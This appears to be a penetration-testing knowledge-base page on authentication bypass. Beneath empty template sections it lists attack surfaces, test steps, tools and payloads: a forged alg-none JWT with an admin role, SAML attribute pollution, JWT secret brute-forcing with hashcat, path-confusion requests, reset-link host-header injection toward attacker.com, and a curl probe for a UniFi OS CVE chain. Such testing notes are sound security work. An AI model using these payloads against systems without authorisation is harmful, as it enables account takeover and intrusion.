# Auth Bypass Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Authentication bypass — exploiting implementation flaws in identity verification to gain access without valid credentials.

## Surface

- SAML SSO endpoints (`/saml/acs`, `/sso/callback`) — XML parsing vulnerabilities
- JWT tokens in `Authorization: Bearer` or cookies — algorithm confusion, weak secrets
- OAuth 2.0 flows — `redirect_uri`, `state` param, implicit grant token leakage
- Path normalization mismatches between proxy and backend (Nginx/Apache/IIS)
- Password reset flows — token predictability, host header injection, reuse
- `Authorization` header stripping by proxy, fallback to unauthenticated handler
- Multi-step auth with state kept in client-side cookie or hidden field

## Test Approach

1. **SAML attribute pollution** — intercept ACS request, duplicate attributes with different namespaces:

   ```xml
   <saml:Attribute Name="role">
     <saml:AttributeValue>user</saml:AttributeValue>
   </saml:Attribute>
   <saml:Attribute Name="role" xmlns:saml="http://evil.com">
     <saml:AttributeValue>admin</saml:AttributeValue>
   </saml:Attribute>
   ```

2. **XML signature wrapping (XSW)** — move the signed element, inject unsigned sibling with attacker data; use SAML Raider (Burp extension)
3. **JWT `alg: none`** — remove signature, set `"alg": "none"`, see if backend accepts:

   ```
   echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
   ```

4. **JWT RS256→HS256 confusion** — sign token with server's public key as HMAC secret
5. **JWT weak secret brute-force**:

   ```
   hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
   ```

6. **OAuth state CSRF** — remove `state` param from authorization request; if accepted, CSRF to link attacker account
7. **Open redirect in redirect_uri** — try `redirect_uri=https://target.com/callback/../../../attacker.com`
8. **Path confusion bypass** (Nginx/Apache):

   ```
   GET /app/admin%2F..%2Fapi/sensitive HTTP/1.1
   GET /app/admin;/api/sensitive HTTP/1.1
   ```

9. **Password reset host header injection**:

   ```
   POST /reset-password HTTP/1.1
   Host: attacker.com
   ```

## Tools

- **SAML Raider** (Burp) — XSW attacks, signature stripping, attribute injection
- **jwt_tool** — test alg confusion, brute-force, claim manipulation; `python3 jwt_tool.py <token> -M at`
- **hashcat** — JWT HMAC brute-force: `hashcat -a 0 -m 16500`
- **nuclei** — auth bypass templates: `nuclei -t auth-bypass/ -u https://target.com`
- **ffuf** — path confusion fuzzing with encoded variants

## Payloads / Probes

```
# JWT none algorithm (header.payload. — no sig)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Path confusion (Nginx strips prefix, Apache doesn't normalize)
GET /api/v1/admin%2F..%2Fusers HTTP/1.1

# SAML namespace confusion — inject admin role under different NS
<Attribute Name="role" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
  <AttributeValue>admin</AttributeValue>
</Attribute>

# OAuth open redirect
?redirect_uri=https://target.com/callback%0d%0aLocation:https://attacker.com

# Cookie prefix bypass (server-side only — inject raw)
Cookie: __Host-session=attacker_value
```

## Chain Opportunities

- **Auth bypass → full ATO** — bypass login, access admin panel
- **SAML bypass → multi-tenant escalation** — assume any tenant's identity in SSO
- **JWT none → privilege escalation** — forge admin role claim
- **Path confusion + auth bypass → SSRF** — reach internal endpoints past auth middleware
- **Password reset + host injection → ATO** — reset link sent to attacker-controlled domain

## Recent Intel

- **The Fragile Lock** · Ruby/PHP SAML attribute pollution + namespace confusion → full auth bypass, PoC published · https://portswigger.net/research/the-fragile-lock
- **SAML Roulette (GitLab)** · `ruby-saml` XML signature bypass via namespace spoofing → unauthenticated admin access on GitLab Enterprise · https://portswigger.net/research/saml-roulette-the-hacker-always-wins
- **CVE-2025-0108** · PAN-OS Nginx/Apache path confusion → pre-auth bypass to protected management API · https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os

## 2026-06-27 — Ubiquiti UniFi OS NGINX Path Confusion Chain

### Ubiquiti UniFi OS — NGINX Prefix Bypass → Unauthenticated Root RCE (CVE-2026-34908/34909/34910)
- **Date:** 2026-06-27 · **Source:** [bishopfox.com](https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis) · **Class:** cve
- **What:** NGINX location-block prefix matching resolves an auth-exempt URL prefix to an authenticated internal backend route, bypassing access control; chained with path traversal (CVE-2026-34909) and input validation flaw (CVE-2026-34910) for unauthenticated root RCE on all UniFi OS devices.
- **Why it matters:** CVSS 10.0, all three KEV'd 2026-06-23 with active exploitation; the NGINX prefix-bypass auth pattern generalizes to any NGINX reverse proxy with misconfigured location blocks — test any `/public/` or exempt prefix that forwards to an authenticated upstream.
- **Hunt signal:** `curl -sv "https://TARGET/public/../api/v2/auth/me" 2>&1 | grep -E "< HTTP|200|403"` — mismatch vs direct `/api/v2/auth/me` indicates prefix bypass
- **Evidence:** [NVD CVE-2026-34908](https://nvd.nist.gov/vuln/detail/CVE-2026-34908) · [BishopFox RCE chain](https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis) · [CISA KEV 2026-06-23](https://www.cisa.gov/news-events/alerts/2026/06/23/cisa-adds-four-known-exploited-vulnerabilities-catalog) · [Ubiquiti SA-064](https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b)
